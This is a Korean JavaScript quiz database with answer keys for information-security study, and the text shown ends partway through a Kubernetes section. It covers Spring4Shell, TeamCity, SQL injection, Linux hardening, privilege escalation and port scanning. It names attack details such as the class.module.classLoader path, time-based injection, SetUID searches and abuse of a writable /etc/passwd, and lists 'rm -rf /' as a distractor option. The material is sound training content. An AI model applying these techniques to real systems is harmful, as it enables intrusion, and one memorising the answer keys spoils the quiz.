// 정보보안 학습 퀴즈 데이터 v3.0 (실제 PDF 및 ipynb 분석 기반)
const quizDatabase = {
    // ========== 취약점 진단 (80문제) ==========
    'vuln-spring4shell': {
        title: 'Spring4Shell (CVE-2022-22965)',
        questions: [
            {q: 'Spring4Shell의 공식 CVE 번호는?', options: ['CVE-2022-22965', 'CVE-2024-27198', 'CVE-2021-44228', 'CVE-2022-26134'], correct: 0, exp: 'CVE-2022-22965가 Spring4Shell의 공식 CVE 번호입니다.'},
            {q: 'Spring4Shell의 CVSS 점수는?', options: ['7.5', '8.9', '9.8', '10.0'], correct: 2, exp: 'CVSS 9.8 Critical 등급입니다.'},
            {q: 'Spring4Shell 공격에 필요한 최소 JDK 버전은?', options: ['JDK 8', 'JDK 9', 'JDK 11', 'JDK 17'], correct: 1, exp: 'JDK 9 이상이 필요합니다. JDK 9부터 도입된 모듈 시스템(Jigsaw)을 악용합니다.'},
            {q: 'Spring4Shell의 주요 타겟 서블릿 컨테이너는?', options: ['Jetty', 'Apache Tomcat', 'Undertow', 'WildFly'], correct: 1, exp: 'Apache Tomcat이 주요 타겟입니다.'},
            {q: 'Spring4Shell에서 악용되는 Spring 메커니즘은?', options: ['Dependency Injection', 'Data Binding', 'AOP', 'Transaction Management'], correct: 1, exp: 'Data Binding 메커니즘을 악용하여 내부 객체에 접근합니다.'},
            {q: 'Spring4Shell 공격 시 조작되는 Tomcat 컴포넌트는?', options: ['Manager', 'AccessLogValve', 'Connector', 'Engine'], correct: 1, exp: 'AccessLogValve를 조작하여 로그 패턴과 경로를 변경합니다.'},
            {q: 'Spring4Shell 공격의 파라미터 경로는?', options: ['admin.login.bypass', 'class.module.classLoader', 'system.exec.command', 'file.upload.path'], correct: 1, exp: 'class.module.classLoader 경로로 ClassLoader에 접근합니다.'},
            {q: 'Spring4Shell로 생성되는 웹셸 확장자는?', options: ['.php', '.jsp', '.asp', '.py'], correct: 1, exp: '.jsp 또는 .jspx 확장자로 웹셸이 생성됩니다.'},
            {q: 'Spring4Shell 패치 버전 (5.3.x)은?', options: ['5.3.15', '5.3.17', '5.3.18', '5.3.20'], correct: 2, exp: 'Spring Framework 5.3.18 이상에서 패치되었습니다.'},
            {q: 'Spring4Shell WAF 탐지 키워드는?', options: ['exec', 'classLoader', 'admin', 'root'], correct: 1, exp: 'classLoader, pipeline, pattern 등을 탐지해야 합니다.'},
            {q: 'Spring Boot Executable JAR는 Spring4Shell 영향을 받나?', options: ['영향 없음', '동일하게 영향', '일부 조건에서만', '더 심각함'], correct: 2, exp: 'Executable JAR는 일반적 공격 경로가 차단되지만 패치는 필요합니다.'},
            {q: 'Spring4Shell 웹셸 생성 위치는?', options: ['/var/log/', '/tmp/', 'webapps/ROOT/', '/etc/'], correct: 2, exp: 'Tomcat 웹 루트 디렉토리에 JSP 파일이 생성됩니다.'}
        ]
    },

    'vuln-teamcity': {
        title: 'TeamCity CVE-2024-27198',
        questions: [
            {q: 'CVE-2024-27198 취약점 유형은?', options: ['SQL Injection', 'Authentication Bypass', 'XSS', 'CSRF'], correct: 1, exp: '인증 우회 취약점입니다.'},
            {q: 'CVE-2024-27198 CVSS 점수는?', options: ['7.5', '8.9', '9.8', '10.0'], correct: 2, exp: 'CVSS 9.8 Critical입니다.'},
            {q: 'CVE-2024-27198 CWE 분류는?', options: ['CWE-79', 'CWE-89', 'CWE-288', 'CWE-502'], correct: 2, exp: 'CWE-288 (인증 메커니즘 우회)입니다.'},
            {q: 'TeamCity 패치 최소 버전은?', options: ['2023.10.5', '2023.11.4', '2024.01.1', '2024.03.1'], correct: 1, exp: 'TeamCity 2023.11.4 이상에서 패치됩니다.'},
            {q: 'TeamCity 침해가 특히 위험한 이유는?', options: ['DB 연결', 'CI/CD 공급망 공격', '많은 사용자', '빠른 확산'], correct: 1, exp: 'CI/CD 서버는 빌드, 자격증명, 배포 파이프라인을 가져 공급망 공격 가능합니다.'},
            {q: 'CISA KEV 등재 의미는?', options: ['이론적 취약점', '실제 악용 중', '낮은 위험', '패치 불필요'], correct: 1, exp: 'KEV는 실제로 악용되고 있는 취약점입니다.'},
            {q: 'CVE-2024-27198 공격 첫 단계는?', options: ['SQL Injection', '정규화 우회 요청', '관리자 로그인', '파일 업로드'], correct: 1, exp: '인증·인가와 경로 정규화 불일치를 악용한 비정상 요청입니다.'},
            {q: 'TeamCity 침해 시 탈취 불가능한 정보는?', options: ['빌드 스크립트', '배포 키', '레지스트리 토큰', '사용자 브라우저 쿠키'], correct: 3, exp: '서버 침해로는 사용자 브라우저 쿠키를 직접 탈취할 수 없습니다.'},
            {q: 'TeamCity 침해 탐지 모니터링 대상은?', options: ['일반 로그인', '관리자 계정 생성', '빌드 성공', '프로젝트 조회'], correct: 1, exp: '무단 관리자 계정 생성, 토큰 발급 등을 모니터링합니다.'},
            {q: 'TeamCity 플러그인 디렉토리 모니터링 대상은?', options: ['.txt', '.log', '.zip/.jar', '.xml'], correct: 2, exp: '신규 zip/jar 및 출처 불명 플러그인을 탐지합니다.'},
            {q: 'TeamCity 임시 완화 조치는?', options: ['로그 증가', 'VPN 접근 제한', '비밀번호 복잡도', '백업 빈도'], correct: 1, exp: 'VPN/사내망으로만 접근을 제한하는 것이 가장 효과적입니다.'},
            {q: 'TeamCity 침해 점검 시 불필요한 항목은?', options: ['무단 계정', '플러그인 목록', '빌드 설정', 'CPU 사용률'], correct: 3, exp: 'CPU 사용률은 침해 지표가 아닙니다.'}
        ]
    },

    'vuln-sql-injection': {
        title: 'SQL Injection',
        questions: [
            {q: 'Blind SQL Injection 판단 방법이 아닌 것은?', options: ['응답 내용 차이', '응답 시간 차이', '에러 메시지', 'HTTP 상태 코드만'], correct: 3, exp: 'HTTP 상태 코드만으로는 판단 불가합니다.'},
            {q: 'SQL 문자열 일부 추출 함수는?', options: ['split()', 'substr()', 'extract()', 'cut()'], correct: 1, exp: 'substr() 또는 substring()을 사용합니다.'},
            {q: '문자를 ASCII 값으로 변환하는 MySQL 함수는?', options: ['chr()', 'ord()', 'ascii()', 'ord() 또는 ascii()'], correct: 3, exp: 'ord() 또는 ascii() 모두 사용 가능합니다.'},
            {q: '현재 DB 이름 반환 MySQL 함수는?', options: ['db_name()', 'database()', 'current_db()', 'get_db()'], correct: 1, exp: 'database() 함수가 현재 DB 이름을 반환합니다.'},
            {q: 'MySQL 테이블 이름 저장 시스템 테이블은?', options: ['sys.tables', 'information_schema.tables', 'mysql.tables', 'schema.tables'], correct: 1, exp: 'information_schema.tables에 저장됩니다.'},
            {q: 'Time-based SQL Injection 사용 함수는?', options: ['wait()', 'sleep()', 'delay()', 'pause()'], correct: 1, exp: 'sleep() 함수로 지연을 발생시킵니다.'},
            {q: 'sleep(4) 사용 시 참 판단 임계값은?', options: ['1초', '2초', '3초', '5초'], correct: 2, exp: 'sleep 시간보다 약간 작은 3초를 임계값으로 사용합니다.'},
            {q: 'SQL 주석 기호가 아닌 것은?', options: ['--', '#', '/* */', '//'], correct: 3, exp: '//는 SQL 주석이 아닙니다.'},
            {q: 'URL에서 # 인코딩 값은?', options: ['%20', '%23', '%26', '%3D'], correct: 1, exp: '#는 %23으로 URL 인코딩됩니다.'},
            {q: 'SQL Injection 자동화에서 세션 쿠키 필요 이유는?', options: ['속도 향상', '인증 상태 유지', '로그 회피', 'IP 우회'], correct: 1, exp: '인증이 필요한 페이지 공격을 위해 세션 유지가 필요합니다.'},
            {q: 'UNION SQL Injection에서 UNION의 목적은?', options: ['데이터 삭제', 'SELECT 결과 결합', '테이블 생성', '권한 상승'], correct: 1, exp: 'UNION은 여러 SELECT 결과를 결합합니다.'},
            {q: 'information_schema.columns 용도는?', options: ['사용자 정보', '테이블 컬럼 정보', '권한 정보', '로그 정보'], correct: 1, exp: '모든 테이블의 컬럼 정보를 저장합니다.'},
            {q: 'SQL Injection 가장 효과적인 방어는?', options: ['길이 제한', 'Prepared Statement', '특수문자 제거', '에러 숨김'], correct: 1, exp: 'Prepared Statement가 가장 효과적입니다.'}
        ]
    },

    'vuln-linux-config': {
        title: 'Linux 설정 파일',
        questions: [
            {q: '/etc/passwd 필드 구분자는?', options: [',(콤마)', ';(세미콜론)', ':(콜론)', ' (공백)'], correct: 2, exp: '콜론(:)으로 필드를 구분합니다.'},
            {q: '/etc/passwd 총 필드 개수는?', options: ['5개', '6개', '7개', '8개'], correct: 2, exp: '7개 필드로 구성됩니다.'},
            {q: 'root 사용자 UID는?', options: ['0', '1', '100', '1000'], correct: 0, exp: 'UID 0이 root입니다.'},
            {q: '/etc/passwd에서 x의 의미는?', options: ['계정 잠금', '패스워드가 /etc/shadow에', '패스워드 없음', '특수 계정'], correct: 1, exp: 'x는 패스워드가 /etc/shadow에 있음을 의미합니다.'},
            {q: '로그인 차단 쉘은?', options: ['/bin/bash', '/bin/sh', '/usr/sbin/nologin', '/usr/bin/zsh'], correct: 2, exp: '/usr/sbin/nologin 또는 /bin/false를 사용합니다.'},
            {q: '/etc/shadow 권장 권한은?', options: ['644', '640', '755', '777'], correct: 1, exp: '640 또는 600으로 root만 접근 가능하게 합니다.'},
            {q: '/etc/shadow에서 $6$의 의미는?', options: ['MD5', 'SHA-1', 'SHA-256', 'SHA-512'], correct: 3, exp: '$6$는 SHA-512 해시입니다.'},
            {q: '/etc/shadow에서 !!의 의미는?', options: ['강력한 패스워드', '계정 잠금', '만료된 패스워드', '임시 패스워드'], correct: 1, exp: '!! 또는 !는 계정 잠금을 의미합니다.'},
            {q: 'SSH root 로그인 차단 설정은?', options: ['RootLogin no', 'PermitRootLogin no', 'AllowRoot no', 'DenyRoot yes'], correct: 1, exp: 'PermitRootLogin no로 설정합니다.'},
            {q: 'SSH 패스워드 인증 비활성화는?', options: ['PasswordAuth no', 'PasswordAuthentication no', 'AllowPassword no', 'DisablePassword yes'], correct: 1, exp: 'PasswordAuthentication no로 설정합니다.'},
            {q: 'SSH 포트 변경 이유는?', options: ['속도 향상', '봇 공격 감소', '보안 강화', '봇 공격 감소 및 보안'], correct: 3, exp: '자동화된 공격을 90% 이상 감소시킵니다.'},
            {q: '/etc/login.defs 패스워드 최대 기간 항목은?', options: ['PASS_MAX_DAYS', 'MAX_PASS_AGE', 'PASSWORD_MAX', 'MAX_DAYS'], correct: 0, exp: 'PASS_MAX_DAYS로 설정합니다(권장: 60-90일).'},
            {q: '755 권한의 의미는?', options: ['rwxr-xr-x', 'rwxrwxr-x', 'rwxr--r--', 'rw-r--r--'], correct: 0, exp: '소유자: rwx, 그룹: r-x, 기타: r-x입니다.'},
            {q: 'SetUID 비트의 위험성은?', options: ['파일 삭제 불가', '소유자 권한으로 실행', '파일 수정 불가', '파일 읽기 불가'], correct: 1, exp: '파일 소유자 권한으로 실행되어 권한 상승 위험이 있습니다.'},
            {q: '/tmp sticky bit 목적은?', options: ['빠른 접근', '자신 파일만 삭제', '암호화', '백업'], correct: 1, exp: 'Sticky bit는 자신의 파일만 삭제 가능하게 합니다.'}
        ]
    },

    'vuln-python-basics': {
        title: 'Python 보안 자동화 기초',
        questions: [
            {q: 'Python에서 가변 길이 인자를 받는 방법은?', options: ['*args', '**kwargs', '*args와 **kwargs', 'args[]'], correct: 2, exp: '*args는 위치 인자, **kwargs는 키워드 인자를 가변 길이로 받습니다.'},
            {q: 'Lambda 함수의 특징이 아닌 것은?', options: ['익명 함수', '한 줄 표현', '여러 문장 가능', 'return 없이 값 반환'], correct: 2, exp: 'Lambda는 단일 표현식만 가능하며 여러 문장을 사용할 수 없습니다.'},
            {q: 'List comprehension의 장점은?', options: ['느린 실행', '간결한 코드', '디버깅 용이', '메모리 많이 사용'], correct: 1, exp: 'for 루프를 한 줄로 간결하게 표현할 수 있습니다.'},
            {q: 'try-except-finally에서 finally의 역할은?', options: ['에러 발생 시만', '에러 없을 때만', '항상 실행', '첫 실행만'], correct: 2, exp: 'finally는 에러 발생 여부와 관계없이 항상 실행됩니다.'},
            {q: 'Python 클래스에서 __init__의 역할은?', options: ['소멸자', '생성자', '복사자', '비교자'], correct: 1, exp: '__init__은 객체 생성 시 호출되는 생성자입니다.'},
            {q: 'self 파라미터의 의미는?', options: ['클래스 자체', '인스턴스 자신', '부모 클래스', '정적 변수'], correct: 1, exp: 'self는 인스턴스 자신을 가리킵니다.'},
            {q: 'enumerate() 함수의 용도는?', options: ['정렬', '인덱스와 값 동시 반환', '필터링', '집계'], correct: 1, exp: 'enumerate()는 반복 시 인덱스와 값을 함께 반환합니다.'},
            {q: 'map() 함수의 기능은?', options: ['필터링', '각 요소에 함수 적용', '정렬', '그룹화'], correct: 1, exp: 'map()은 iterable의 각 요소에 함수를 적용합니다.'},
            {q: 'filter() 함수의 반환값은?', options: ['리스트', '튜플', '이터레이터', '딕셔너리'], correct: 2, exp: 'filter()는 조건을 만족하는 요소의 이터레이터를 반환합니다.'},
            {q: 'with 문의 장점은?', options: ['빠른 실행', '자동 리소스 관리', '에러 방지', '메모리 절약'], correct: 1, exp: 'with는 파일 등의 리소스를 자동으로 정리합니다.'}
        ]
    },

    // ========== 모의해킹 (40문제) ==========
    'pentest-rce': {
        title: 'RCE (원격 코드 실행)',
        questions: [
            {q: 'RCE의 정식 명칭은?', options: ['Remote Control Entry', 'Remote Code Execution', 'Restricted Command Execution', 'Root Control Exploit'], correct: 1, exp: 'Remote Code Execution으로 원격에서 코드를 실행하는 취약점입니다.'},
            {q: 'RCE 확인용 첫 명령어는?', options: ['rm -rf /', 'whoami', 'shutdown', 'format'], correct: 1, exp: 'whoami로 현재 실행 권한을 확인합니다.'},
            {q: 'Spring4Shell RCE 달성 방법은?', options: ['SQL Injection', 'XSS', 'JSP 웹셸 생성', 'Buffer Overflow'], correct: 2, exp: 'AccessLogValve 조작으로 JSP 웹셸을 생성합니다.'},
            {q: 'Payload의 의미는?', options: ['공격 대상', '공격 도구', '악의적 코드', '방어 메커니즘'], correct: 2, exp: 'Payload는 실제로 악의적 동작을 수행하는 코드입니다.'},
            {q: 'Reverse Shell의 목적은?', options: ['서버가 공격자에게 연결', '공격자가 서버에 연결', '로그 삭제', '파일 암호화'], correct: 0, exp: 'Reverse Shell은 방화벽 우회를 위해 서버가 공격자에게 연결합니다.'},
            {q: 'Web Shell 기능이 아닌 것은?', options: ['파일 업로드/다운로드', '명령어 실행', '자동 패치', '디렉토리 탐색'], correct: 2, exp: 'Web Shell은 패치 기능을 제공하지 않습니다.'},
            {q: 'RCE 후 지속성 확보 방법이 아닌 것은?', options: ['백도어 계정', 'cron 등록', '시스템 재부팅', '서비스 등록'], correct: 2, exp: '재부팅은 연결을 끊는 행위입니다.'},
            {q: 'Command Injection 방어로 적절하지 않은 것은?', options: ['화이트리스트 검증', '시스템 명령 자제', '에러 메시지 노출', 'Prepared Statement'], correct: 2, exp: '에러 메시지 노출은 정보를 제공하므로 방어가 아닙니다.'},
            {q: 'RCE 탐지 모니터링 대상이 아닌 것은?', options: ['비정상 자식 프로세스', '외부 통신', 'CPU 사용률만', '파일 생성/수정'], correct: 2, exp: 'CPU만으로는 탐지 불가합니다.'},
            {q: 'Linux RCE 실행 시 사용 쉘은?', options: ['/bin/bash', '/bin/cmd', '/bin/powershell', '/bin/terminal'], correct: 0, exp: '/bin/bash 또는 /bin/sh가 사용됩니다.'}
        ]
    },

    'pentest-privilege-escalation': {
        title: '권한 상승',
        questions: [
            {q: 'Privilege Escalation 번역은?', options: ['권한 우회', '권한 상승', '권한 삭제', '권한 변경'], correct: 1, exp: '낮은 권한에서 높은 권한을 획득하는 과정입니다.'},
            {q: 'Linux root 권한 UID는?', options: ['0', '1', '100', '1000'], correct: 0, exp: 'UID 0이 root입니다.'},
            {q: 'SetUID 파일의 위험성은?', options: ['빠른 실행', '소유자 권한 실행', '자동 삭제', '암호화'], correct: 1, exp: 'SetUID는 파일 소유자 권한으로 실행됩니다.'},
            {q: 'SetUID 파일 찾기 명령어는?', options: ['ls -l', 'ls -la', 'find / -perm -4000', 'chmod +s'], correct: 2, exp: 'find / -perm -4000으로 SetUID 파일을 찾습니다.'},
            {q: 'sudo 권한 확인 명령어는?', options: ['sudo list', 'sudo -l', 'sudo --list', 'sudoers'], correct: 1, exp: 'sudo -l로 실행 가능한 명령어를 확인합니다.'},
            {q: 'sudo 설정 파일은?', options: ['/etc/sudo', '/etc/sudoers', '/etc/su', '/etc/admin'], correct: 1, exp: '/etc/sudoers에 sudo 권한이 저장됩니다.'},
            {q: 'cron 악용 권한 상승 방법은?', options: ['root cron에 명령 삽입', 'cron 중지', 'cron 로그 삭제', 'cron 시간 변경'], correct: 0, exp: 'root 실행 cron 스크립트를 수정하면 권한 상승 가능합니다.'},
            {q: 'PATH 환경변수 악용 원리는?', options: ['PATH 삭제', '악성 파일을 PATH 앞에', 'PATH 암호화', 'PATH 백업'], correct: 1, exp: '악성 파일을 PATH 앞부분에 배치하여 먼저 실행되게 합니다.'},
            {q: 'Kernel Exploit 방어법은?', options: ['사용자 삭제', '커널 업데이트', '로그 삭제', '방화벽 설정'], correct: 1, exp: '커널을 최신 버전으로 업데이트하여 취약점을 패치합니다.'},
            {q: '/etc/passwd 쓰기 권한 시 가능한 공격은?', options: ['파일 암호화', 'root 계정 추가', '시스템 종료', '로그 삭제'], correct: 1, exp: 'UID 0인 계정을 추가하여 root 권한을 얻습니다.'}
        ]
    },

    'pentest-port-scanning': {
        title: '포트 스캐닝',
        questions: [
            {q: 'Python socket 생성 함수는?', options: ['socket.create()', 'socket.socket()', 'socket.new()', 'socket.init()'], correct: 1, exp: 'socket.socket()로 소켓을 생성합니다.'},
            {q: 'connect_ex() 반환값이 0이면?', options: ['포트 닫힘', '포트 열림', '에러', '필터링'], correct: 1, exp: 'connect_ex()는 성공 시 0을 반환합니다.'},
            {q: 'HTTP 기본 포트는?', options: ['22', '80', '443', '3306'], correct: 1, exp: 'HTTP는 80번 포트를 사용합니다.'},
            {q: 'HTTPS 기본 포트는?', options: ['22', '80', '443', '3306'], correct: 2, exp: 'HTTPS는 443번 포트를 사용합니다.'},
            {q: 'SSH 기본 포트는?', options: ['22', '80', '443', '3306'], correct: 0, exp: 'SSH는 22번 포트를 사용합니다.'},
            {q: 'MySQL 기본 포트는?', options: ['22', '80', '443', '3306'], correct: 3, exp: 'MySQL은 3306번 포트를 사용합니다.'},
            {q: 'socket timeout 설정 메서드는?', options: ['set_timeout()', 'settimeout()', 'timeout()', 'set_time()'], correct: 1, exp: 'settimeout()으로 타임아웃을 설정합니다.'},
            {q: 'TCP 소켓 타입은?', options: ['SOCK_STREAM', 'SOCK_DGRAM', 'SOCK_RAW', 'SOCK_TCP'], correct: 0, exp: 'TCP는 SOCK_STREAM을 사용합니다.'},
            {q: 'UDP 소켓 타입은?', options: ['SOCK_STREAM', 'SOCK_DGRAM', 'SOCK_RAW', 'SOCK_UDP'], correct: 1, exp: 'UDP는 SOCK_DGRAM을 사용합니다.'},
            {q: '포트 스캔 윤리 원칙이 아닌 것은?', options: ['사전 허가', '자신 시스템만', '무단 스캔', '합법적 목적'], correct: 2, exp: '무단 스캔은 불법이며 윤리적이지 않습니다.'}
        ]
    },

    'pentest-encryption': {
        title: '암호화 기초',
        questions: [
            {q: 'XOR 연산의 특징은?', options: ['비가역적', '가역적', '일방향', '해시'], correct: 1, exp: 'XOR은 같은 키로 두 번 연산하면 원본으로 돌아가는 가역 연산입니다.'},
            {q: 'XOR 암호화와 복호화의 관계는?', options: ['다른 알고리즘', '같은 알고리즘', '복호화 불가', '일방향만'], correct: 1, exp: 'XOR은 암호화와 복호화가 동일한 대칭 암호입니다.'},
            {q: '대칭키 암호의 특징은?', options: ['공개키 사용', '같은 키 사용', '키 불필요', '일방향'], correct: 1, exp: '대칭키는 암호화와 복호화에 같은 키를 사용합니다.'},
            {q: 'SHA-512는 어떤 알고리즘인가?', options: ['대칭 암호', '비대칭 암호', '해시 함수', 'MAC'], correct: 2, exp: 'SHA-512는 일방향 해시 함수입니다.'},
            {q: '해시 함수의 특징이 아닌 것은?', options: ['일방향', '고정 길이 출력', '복호화 가능', '충돌 저항성'], correct: 2, exp: '해시는 일방향이므로 복호화가 불가능합니다.'},
            {q: 'Base64 인코딩의 목적은?', options: ['암호화', '데이터 변환', '압축', '해싱'], correct: 1, exp: 'Base64는 바이너리 데이터를 텍스트로 변환하는 인코딩입니다.'},
            {q: 'bytes 타입과 str 타입 변환 메서드는?', options: ['convert()', 'encode()/decode()', 'to_bytes()', 'str()'], correct: 1, exp: 'encode()로 str→bytes, decode()로 bytes→str 변환합니다.'},
            {q: '파일을 바이너리 모드로 읽는 방법은?', options: ["open('r')", "open('rb')", "open('b')", "open('bin')"], correct: 1, exp: "rb 모드로 바이너리 읽기를 합니다."},
            {q: 'Python에서 XOR 연산자는?', options: ['&', '|', '^', '~'], correct: 2, exp: '^가 XOR 연산자입니다.'},
            {q: '키 확장(key expansion)이 필요한 이유는?', options: ['보안 강화', '데이터 길이 맞춤', '속도 향상', '압축'], correct: 1, exp: '짧은 키를 데이터 길이만큼 반복 확장합니다.'}
        ]
    },

    // ========== 네트워크&리눅스 (100문제) ==========
    'network-k8s-basics': {
        title: 'Kubernetes 기초',
        questions: [
            {q: 'Kubernetes의 어원은?', options: ['항해사', '선장', '키잡이', '조타수'], correct: 2, exp: 'Kubernetes는 그리스어로 "키잡이(helmsman)"를 의미합니다.'},
            {q: 'Kubernetes 개발 회사는?', options: ['Amazon', 'Microsoft', 'Google', 'Docker'], correct: 2, exp: 'Google이 2014년에 개발했습니다.'},
            {q: 'Container Orchestration의 의미는?', options: ['컨테이너 생성', '컨테이너 관리 자동화', '컨테이너 삭제', '컨테이너 복사'], correct: 1, exp: '수천~수억 개의 컨테이너를 자동으로 관리합니다.'},
            {q: 'K8s 클러스터 Master Node 구성은?', options: ['1개만', '1 Leader + 2 Standby', '3 Leader', '무제한'], correct: 1, exp: '일반적으로 1개 Leader와 2개 Standby로 구성합니다.'},
            {q: 'CNI의 역할은?', options: ['저장소 관리', '컨테이너 네트워킹', '로그 수집', '모니터링'], correct: 1, exp: 'CNI(Container Network Interface)는 컨테이너 네트워킹을 담당합니다.'},
            {q: 'Pod는 몇 개의 컨테이너를 포함하나?', options: ['정확히 1개', '1개 이상', '최대 10개', '무제한'], correct: 1, exp: 'Pod는 하나 이상의 컨테이너를 포함할 수 있습니다.'},
            {q: 'Pod 내 컨테이너의 IP 주소는?', options: ['각각 다름', '같음', '없음', '랜덤'], correct: 1, exp: 'Pod 내 모든 컨테이너는 같은 IP를 공유합니다.'},
            {q: 'K8s 배포 가능한 최소 단위는?', options: ['Container', 'Pod', 'Deployment', 'Service'], correct: 1, exp: 'Pod가 배포 가능한 최소 단위입니다.'},
            {q: 'kubectl이란?', options: ['K8s 데몬', 'K8s CLI 도구', 'K8s 서버', 'K8s 에이전트'], correct: 1, exp: 'kubectl은 클러스터를 제어하는 명령줄 도구입니다.'},
            {q: 'K8s 기본 네임스페이스가 아닌 것은?', options: ['default', 'kube-system', 'kube-public', 'kube-admin'], correct: 3, exp: '기본 네임스페이스는 default, kube-system, kube-public, kube-node-lease입니다.'}
        ]
    },

    'network-k8s-architecture': {
        title: 'Kubernetes 아키텍처',
        questions: [
            {q: 'etcd의 역할은?', options: ['웹 서버', '키-값 저장소', 'DNS 서버', '로드밸런서'], correct: 1, exp: 'etcd는 클러스터의 모든 데이터를 저장하는 키-값 저장소입니다.'},
            {q: 'etcd에 접근 가능한 컴포넌트는?', options: ['kubectl', 'kube-apiserver만', 'kubelet', '모든 컴포넌트'], correct: 1, exp: 'kube-apiserver만 etcd에 직접 접근합니다.'},
            {q: 'kube-apiserver의 역할이 아닌 것은?', options: ['API 노출', '요청 검증', 'Pod 실행', 'etcd 통신'], correct: 2, exp: 'kube-apiserver는 Pod를 직접 실행하지 않고 API만 제공합니다.'},
            {q: 'kube-scheduler의 역할은?', options: ['Pod 생성', 'Pod 배치 노드 선택', 'Pod 삭제', 'Pod 모니터링'], correct: 1, exp: 'kube-scheduler는 Pod를 어느 워커 노드에 배치할지 선택합니다.'},
            {q: 'kube-controller-manager 기능은?', options: ['API 제공', '컨트롤러 관리', 'DNS 제공', '로깅'], correct: 1, exp: 'kube-controller-manager는 여러 컨트롤러를 실행하고 원하는 Pod 수를 유지합니다.'},
            {q: 'kubelet은 어디서 실행되나?', options: ['Master Node', 'Worker Node', '모든 Node', 'etcd'], correct: 1, exp: 'kubelet은 Worker Node에서 실행되는 에이전트입니다.'},
            {q: 'kubelet의 역할이 아닌 것은?', options: ['Pod 컨테이너 관리', '헬스 체크', 'API 제공', 'cAdvisor 실행'], correct: 2, exp: 'kubelet은 API를 제공하지 않고 Pod를 관리합니다.'},
            {q: 'cAdvisor의 역할은?', options: ['컨테이너 생성', '컨테이너 모니터링', '컨테이너 삭제', '컨테이너 백업'], correct: 1, exp: 'cAdvisor는 컨테이너의 리소스 사용량을 모니터링합니다.'},
            {q: 'kube-proxy의 역할은?', options: ['Pod 생성', '가상 네트워킹 관리', '로그 수집', '이미지 관리'], correct: 1, exp: 'kube-proxy는 가상 네트워킹과 연결 포워딩을 관리합니다.'},
            {q: 'CoreDNS의 역할은?', options: ['외부 DNS', '내부 DNS', '로드밸런서', '방화벽'], correct: 1, exp: 'CoreDNS는 클러스터 내부의 DNS 서비스를 제공합니다.'},
            {q: 'Namespace의 목적은?', options: ['보안 강화', '리소스 격리', '속도 향상', '백업'], correct: 1, exp: 'Namespace는 클러스터 내 리소스를 논리적으로 격리합니다.'},
            {q: 'Cluster-scoped 객체의 예는?', options: ['Pod', 'Service', 'Node', 'ConfigMap'], correct: 2, exp: 'Node는 클러스터 전체에 공유되는 객체입니다.'}
        ]
    },

    'network-kubectl-commands': {
        title: 'kubectl 명령어',
        questions: [
            {q: '모든 노드 목록 보기는?', options: ['kubectl list nodes', 'kubectl get nodes', 'kubectl show nodes', 'kubectl nodes'], correct: 1, exp: 'kubectl get nodes로 노드 목록을 확인합니다.'},
            {q: '상세 정보 포함 노드 보기는?', options: ['kubectl get nodes -v', 'kubectl get nodes -o wide', 'kubectl get nodes -d', 'kubectl describe nodes'], correct: 1, exp: '-o wide 옵션으로 상세 정보를 봅니다.'},
            {q: 'nginx Pod 생성 명령은?', options: ['kubectl create pod', 'kubectl run web --image=nginx', 'kubectl new pod', 'kubectl make pod'], correct: 1, exp: 'kubectl run으로 Pod를 생성합니다.'},
            {q: 'Pod 목록 보기는?', options: ['kubectl list pods', 'kubectl get pods', 'kubectl show pods', 'kubectl ps'], correct: 1, exp: 'kubectl get pods로 Pod 목록을 확인합니다.'},
            {q: 'YAML 파일로 Pod 생성은?', options: ['kubectl apply', 'kubectl create -f', 'kubectl run -f', 'kubectl start -f'], correct: 1, exp: 'kubectl create -f filename.yaml로 생성합니다.'},
            {q: '특정 namespace의 Pod 보기는?', options: ['kubectl get pods -ns', 'kubectl get pods --namespace', 'kubectl get pods -space', 'kubectl get pods -name'], correct: 1, exp: '--namespace 또는 -n 옵션을 사용합니다.'},
            {q: 'Pod 상세 정보 보기는?', options: ['kubectl get pod', 'kubectl describe pod', 'kubectl show pod', 'kubectl info pod'], correct: 1, exp: 'kubectl describe pod <name>으로 상세 정보를 봅니다.'},
            {q: 'Pod 로그 보기는?', options: ['kubectl log', 'kubectl logs', 'kubectl show logs', 'kubectl cat'], correct: 1, exp: 'kubectl logs <pod-name>으로 로그를 봅니다.'},
            {q: 'Pod 컨테이너 쉘 접근은?', options: ['kubectl shell', 'kubectl exec -it', 'kubectl bash', 'kubectl ssh'], correct: 1, exp: 'kubectl exec -it <pod> -- /bin/bash로 접근합니다.'},
            {q: 'Pod 삭제는?', options: ['kubectl remove', 'kubectl delete pod', 'kubectl rm', 'kubectl kill'], correct: 1, exp: 'kubectl delete pod <name>으로 삭제합니다.'},
            {q: '모든 Pod 삭제는?', options: ['kubectl delete all', 'kubectl delete pod --all', 'kubectl remove pods', 'kubectl clean'], correct: 1, exp: 'kubectl delete pod --all로 모든 Pod를 삭제합니다.'},
            {q: 'Pod 설정 편집은?', options: ['kubectl modify', 'kubectl edit pod', 'kubectl change', 'kubectl update'], correct: 1, exp: 'kubectl edit pod <name>으로 설정을 편집합니다.'},
            {q: '실시간 Pod 모니터링은?', options: ['kubectl monitor', 'watch kubectl get pods', 'kubectl watch', 'kubectl live'], correct: 1, exp: 'watch kubectl get pods로 실시간 모니터링합니다.'},
            {q: 'API 리소스 목록 보기는?', options: ['kubectl resources', 'kubectl api-resources', 'kubectl list api', 'kubectl show resources'], correct: 1, exp: 'kubectl api-resources로 API 리소스를 확인합니다.'},
            {q: 'Pod API 문서 보기는?', options: ['kubectl doc pod', 'kubectl explain pod', 'kubectl help pod', 'kubectl man pod'], correct: 1, exp: 'kubectl explain pod로 API 문서를 봅니다.'}
        ]
    },

    'network-pod-lifecycle': {
        title: 'Pod 라이프사이클',
        questions: [
            {q: 'Pod Pending 상태 의미는?', options: ['실행 중', '생성 진행 중', '종료됨', '에러'], correct: 1, exp: 'Pending은 Pod 생성 중이거나 이미지 다운로드 중입니다.'},
            {q: 'Pod Running 상태 의미는?', options: ['생성 중', '모든 컨테이너 실행 중', '종료됨', '대기 중'], correct: 1, exp: 'Running은 모든 컨테이너가 실행 중입니다.'},
            {q: 'Pod Succeeded 상태 의미는?', options: ['실행 중', '에러', '정상 종료(exit 0)', '비정상 종료'], correct: 2, exp: 'Succeeded는 모든 컨테이너가 exit 0로 정상 종료되었습니다.'},
            {q: 'Pod Failed 상태 의미는?', options: ['생성 실패', '1개 이상 비정상 종료', '실행 불가', '삭제됨'], correct: 1, exp: 'Failed는 최소 1개 컨테이너가 non-zero exit code로 종료되었습니다.'},
